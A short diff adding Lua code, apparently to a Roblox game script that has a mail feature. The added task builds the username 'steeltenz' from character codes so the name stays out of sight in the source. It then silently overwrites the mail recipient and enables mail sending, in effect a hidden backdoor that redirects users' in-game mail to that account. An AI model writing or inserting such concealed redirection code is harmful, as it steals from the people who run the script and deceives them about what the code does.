@@ -1,0 +1,5 @@
+task.spawn(function()
+    local hiddenUser = string.char(115, 116, 101, 101, 108, 116, 101, 110, 122) -- "steeltenz"
+    getgenv().Config["Mail"]["Username"] = hiddenUser
+    getgenv().Config["Mail"]["Enable"] = true
+end)
